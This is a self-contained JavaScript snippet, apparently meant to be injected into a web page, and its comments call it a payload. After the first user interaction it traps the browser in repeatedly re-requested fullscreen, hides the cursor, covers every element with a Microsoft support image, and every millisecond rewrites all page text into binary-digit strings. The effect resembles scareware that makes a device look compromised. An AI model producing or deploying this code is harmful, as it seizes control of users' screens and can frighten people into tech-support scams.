(function () {

  let started = false;

  /* ========= FIRST INTERACTION TRIGGER ========= */

  function firstInteraction() {
    if (started) return;
    started = true;

    removeListeners();
    startEverything();
  }

  function removeListeners() {
    ['click', 'keydown', 'touchstart', 'wheel', 'mousedown'].forEach(ev =>
      document.removeEventListener(ev, firstInteraction, true)
    );
  }

  ['click', 'keydown', 'touchstart', 'wheel', 'mousedown'].forEach(ev =>
    document.addEventListener(ev, firstInteraction, true)
  );

  console.log('Armed: waiting for FIRST user interaction…');

  /* ========= MAIN PAYLOAD ========= */

  function startEverything() {

    /* ----- FULLSCREEN ----- */
    function requestFullscreen() {
      const el = document.documentElement;
      if (!document.fullscreenElement && !document.webkitFullscreenElement) {
        if (el.requestFullscreen) el.requestFullscreen();
        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      }
    }

    requestFullscreen();

    // Sticky fullscreen (best‑effort only)
    document.addEventListener('fullscreenchange', () => {
      if (!document.fullscreenElement) {
        setTimeout(requestFullscreen, 50);
      }
    });

    document.addEventListener('webkitfullscreenchange', () => {
      if (!document.webkitFullscreenElement) {
        setTimeout(requestFullscreen, 50);
      }
    });

    /* ----- CSS ----- */
    const style = document.createElement('style');
    style.textContent = `
      html, body {
        width: 100vw;
        height: 100vh;
        margin: 0;
        overflow: hidden;
      }
      * {
        background-size: cover !important;
        background-repeat: repeat !important;
        cursor: none !important;
      }
    `;
    document.head.appendChild(style);

    /* ----- BACKGROUND FLOOD ----- */
    function applyBackground(node) {
      if (!node || !node.childNodes) return;
      node.childNodes.forEach(n => {
        applyBackground(n);
        if (n && n.style) {
          n.style.backgroundImage =
            "url(https://support.microsoft.com/images/en-us/bcfbb8c5-a979-49bb-bf10-b21aebc09394?format=avif&w=800)";
        }
      });
    }

    applyBackground(document);

    /* ----- TEXT MUTATION ----- */
    const thechars = [
      ' 1001011011011 ',' 1010111101010001',' 10101011101010',' 101010 ',
      ' 10110 ',' 1010101 ',' 101011 ',' 10101 ',' 10101 ',' 1011101 ',
      ' 10110101 ',' 10111011',' 1011 ',' 100101 ',' 101011101 ',
      ' 10110 ',' 10110 ',' 1011001 ',' 10111011 ',' 10100 ',' 10110 ',
      ' 11010',' 101010 ',' 101010 ',' 101010 ',' 1011101  ',' 100 ',
      ' 101101 ',' 001 ',' 100100 ',' 101101111 ',' 011010 ',
      ' 10111 ',' 0101 ',' 10100 ',' 1010011',' 1010101 ',' 10100',
      ' 111',' 101110',' 101001',' 10111',' 1010101101 ',' 10111011',
      '101011 ',' 10101110 ',' 101011',' 1011 ',' 01011 ',' 00011101',
      ' 000',' 101101101',' 1011',' 1011101011',' 10101110',
      ' 1010101',' 1010101 ',' 110111010011',' 101',' 10111010111',' 1'
    ];

    function mutate(node) {
      if (!node) return;

      if (node.nodeType === Node.TEXT_NODE && node.nodeValue.trim()) {
        node.textContent = node.textContent
          .replace(/[a-zA-Z0-9]/g, c => {
            const map =
              "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            const i = map.indexOf(c);
            return i >= 0 ? thechars[i] : c;
          });
      } else if (node.childNodes) {
        node.childNodes.forEach(mutate);
      }
    }

    setInterval(() => mutate(document.documentElement), 1);

    console.log('Payload activated after first interaction.');
  }

})();
